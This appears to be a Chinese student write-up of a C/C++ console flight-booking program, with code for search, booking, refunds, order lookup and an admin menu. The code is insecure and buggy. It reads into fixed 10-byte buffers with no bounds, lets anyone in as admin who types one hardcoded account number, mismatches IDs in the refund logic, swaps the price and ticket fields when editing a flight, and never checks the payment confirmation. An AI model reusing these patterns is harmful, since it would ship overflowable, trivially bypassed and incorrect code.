<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Search</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="keyword">int</span> air_id,i=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在查找航班   ‖---\n\n"</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\t\t\t\t   ************************************************************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\t\t\t\t   *		1、按航班号查询		2、按抵达地点查询     *\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\t\t\t\t   ************************************************************\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入查询方式:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;select);<span class="comment">// 通过输入的编号运行相应的子函数 </span></span><br><span class="line">            <span class="keyword">if</span>(select==<span class="number">1</span>)&#123;</span><br><span class="line">				Search_id();<span class="comment">//按航班号查询 </span></span><br><span class="line">			&#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(select==<span class="number">2</span>)&#123;</span><br><span class="line">				Search_end();<span class="comment">//按抵达地点查询 </span></span><br><span class="line">			&#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"cls"</span>);<span class="comment">// 输错清屏重输 </span></span><br><span class="line">                Search();</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./3.png" alt="图2-3"></p>
<p><img src="./4.png" alt="图2-4"></p>
<figure class="image-box">
                <img src="./5.png" alt="图2-5" title class>
                <p>图2-5</p>
            </figure>
<h4 id="订票界面"><a href="#订票界面" class="headerlink" title="订票界面"></a>订票界面</h4><p>用到c语言的标准输入输出流,这样就可以正常向文件中传输数据,乘客可以按照自己查询的目的地信息进行订票操作.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Book</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a_end[<span class="number">20</span>];<span class="comment">//定义一个新的机终点变量 </span></span><br><span class="line">    <span class="keyword">char</span> lname[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> lcard[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i, w = <span class="number">0</span>,p,num,s;<span class="comment">//用w进行判断 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在进行订票   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请您输入要前往的目的地："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, a_end);<span class="comment">//输入飞机终点 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t     航班ID    起降时间      起飞日期      起点站      终点站      余票      价格\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;<span class="comment">//按照写入文件中的数据数列出 </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(a_end,data[i].<span class="built_in">end</span>)==<span class="number">0</span>&amp;&amp;data[i].P_num!=<span class="number">0</span>)&#123;<span class="comment">//列出想要查找的还有票的目的地 </span></span><br><span class="line">        w=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%24d %11s %11s %12s %12s %10d %10d\n"</span>,data[i].ID,data[i].time,data[i].data,data[i].start,data[i].<span class="built_in">end</span>,data[i].P_num,data[i].price);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请选择您的航班:"</span>);</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;p;<span class="comment">//c语言的标准输入输出流,给p赋值,下方同理 </span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(p==data[i].ID)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入你的名字:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;user[use].name;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入你的证件号:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;user[use].card;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入购票数:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   确认购票请支付%d元,请按1确认:"</span>,data[i].price*num);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   购票成功!"</span>);</span><br><span class="line">                    data[i].P_num-=num;<span class="comment">//票数-1 </span></span><br><span class="line">                    writeData();</span><br><span class="line">                        user[use].bill=use+<span class="number">1000</span>;<span class="comment">//订单号比较好看 </span></span><br><span class="line">                        user[use].ticket=num;</span><br><span class="line">                        user[use].airID=data[i].ID;</span><br><span class="line">                        use++;</span><br><span class="line">                        userWrite();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (w==<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   没有您想查询的航班!\n"</span>);</span><br><span class="line">	&#125; </span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    main_menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./6.png" alt="图2-6"></p>
<h4 id="退票界面"><a href="#退票界面" class="headerlink" title="退票界面"></a>退票界面</h4><p>原理同订票界面,多了一步要同步更新文件内的数据.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Back</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> lname[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> lcard[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> b,y;</span><br><span class="line">    <span class="keyword">int</span> i,w=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在进行退票   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的姓名:"</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;lname;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的证件号:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,lcard);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(lname,user[i].name)==<span class="number">0</span>&amp;&amp;user[i].ticket!=<span class="number">0</span>&amp;&amp;<span class="built_in">strcmp</span>(lcard,user[i].card)==<span class="number">0</span>)&#123; <span class="comment">//输出和乘客信息符合的已订票信息</span></span><br><span class="line">            <span class="keyword">if</span>(w==<span class="number">0</span>)&#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t     乘客订单      姓名      身份证号      票数      航班号\n"</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            w++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   对不起,不存在该乘客!\n"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入订单:"</span>);</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">			<span class="keyword">int</span> j,t;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)</span><br><span class="line">                <span class="keyword">if</span>(b==user[i].bill)</span><br><span class="line">                &#123;</span><br><span class="line">                    t=i;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   确认退票1:"</span>);</span><br><span class="line">                    <span class="built_in">cin</span>&gt;&gt;y;</span><br><span class="line">                    <span class="keyword">if</span>(y==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;count;j++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(data[j].ID==b)</span><br><span class="line">                        &#123;</span><br><span class="line">                            data[j].P_num+=user[i].ticket;</span><br><span class="line">                            writeData();</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                user[t].ticket=<span class="number">0</span>;</span><br><span class="line">                user[t].airID=<span class="number">0</span>;</span><br><span class="line">                userWrite();</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   退票成功!\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        main_menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./7.png" alt="图2-7"></p>
<h4 id="浏览乘客信息界面"><a href="#浏览乘客信息界面" class="headerlink" title="浏览乘客信息界面"></a>浏览乘客信息界面</h4><p>在进行订票退票操作时都有浏览一部分符合条件的乘客信息了,这个界面显示的是乘客的所有订票信息,原理同上.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bill</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> lname[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> lcard[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i,w=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在浏览订单   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的姓名:"</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;lname;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入您的证件号:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,lcard);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(lname,user[i].name)==<span class="number">0</span>&amp;&amp;user[i].ticket!=<span class="number">0</span>&amp;&amp;<span class="built_in">strcmp</span>(lcard,user[i].card)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(w==<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t     乘客订单      姓名      身份证号      票数      航班号\n"</span>);</span><br><span class="line">            w=<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   对不起,不存在该乘客!\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">    	getch();</span><br><span class="line">        main_menu();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./8.png" alt="图2-8"></p>
<h4 id="管理界面"><a href="#管理界面" class="headerlink" title="管理界面"></a>管理界面</h4><p>引入了管理员验证,并将后台管理的功能归类到一个子函数里进行调用.</p>
<p>管理员验证代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deal</span><span class="params">()</span><span class="comment">//管理员账号设定(即输入正确密码进入管理系统) </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,t=<span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入账号："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;account);</span><br><span class="line">    <span class="keyword">if</span> (account==<span class="number">200214</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    admire();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>后台管理界面代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">admire</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choic_number; <span class="comment">//命令选择</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   +------欢迎使用订票管理系统--------+\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	1.航班信息录入                |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	2.航班信息修改	              |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	3.航班乘客信息	              |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	4.航班列表                    |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	5.整理航班信息	              |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	6.返回大厅                    |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   |	0.退出                        |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t   +----------------------------------+\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入操作指令:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choic_number);</span><br><span class="line">    <span class="keyword">switch</span>(choic_number) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            input(); <span class="keyword">break</span>;<span class="comment">//登录</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            fix(); <span class="keyword">break</span>; <span class="comment">//注册</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            passager();<span class="keyword">break</span>; <span class="comment">//乘客信息</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            List();<span class="keyword">break</span>;<span class="comment">//航班列表</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            order();<span class="keyword">break</span>; <span class="comment">//整理航班信息</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            main_menu();<span class="keyword">break</span>;<span class="comment">//返回大厅</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            drop();<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   输入错误，请重新输入!"</span>);</span><br><span class="line">            admire();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./9.png" alt="图2-9"></p>
<h5 id="航班信息录入"><a href="#航班信息录入" class="headerlink" title="航班信息录入"></a>航班信息录入</h5><p>录入航班信息并写入文件.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next;<span class="comment">//继续操作 </span></span><br><span class="line">    inf++;<span class="comment">//计数 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在录入航班信息   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入航班号:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[count].ID);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起降时间:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].time);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入日期:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起点:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入终点:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[count].<span class="built_in">end</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入余票:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[count].P_num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入票价:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[count].price);</span><br><span class="line">        count++;</span><br><span class="line">        writeData();<span class="comment">//写入数据 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   %d个数据录入完毕\n"</span>,inf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   继续录入请按1,结束操作请按任意键返回上一层\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;next);</span><br><span class="line">        <span class="keyword">if</span>(next==<span class="number">1</span>) input();</span><br><span class="line">        <span class="keyword">else</span> system(<span class="string">"cls"</span>); admire();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
<p><img src="./10.png" alt="图2-10"></p>
<h5 id="航班信息修改"><a href="#航班信息修改" class="headerlink" title="航班信息修改"></a>航班信息修改</h5><p>修改航班信息并写入文件.</p>
<p>代码如下:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fix</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p_id,t=<span class="number">-1</span>,i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在修改航班   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入需操作的航班ID:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;p_id);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;<span class="comment">//判定操作是否有效</span></span><br><span class="line">        <span class="keyword">if</span>(data[i].ID==p_id)&#123;</span><br><span class="line">            t=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   对不起,无此次航班。重新操作请按1,按任意键返回上一层\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> s;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;s);</span><br><span class="line">            <span class="keyword">if</span>(s==<span class="number">1</span>) fix();</span><br><span class="line">            <span class="keyword">else</span> admire();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起降时间:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].time);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入日期:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].data);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起点:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].start);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入终点:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].<span class="built_in">end</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入票价:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[t].P_num);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入余票:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[t].price);</span><br><span class="line">            writeData();<span class="comment">//写入文件 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   修改成功!\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">    		getch();</span><br><span class="line">            admire();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序运行图:</p>
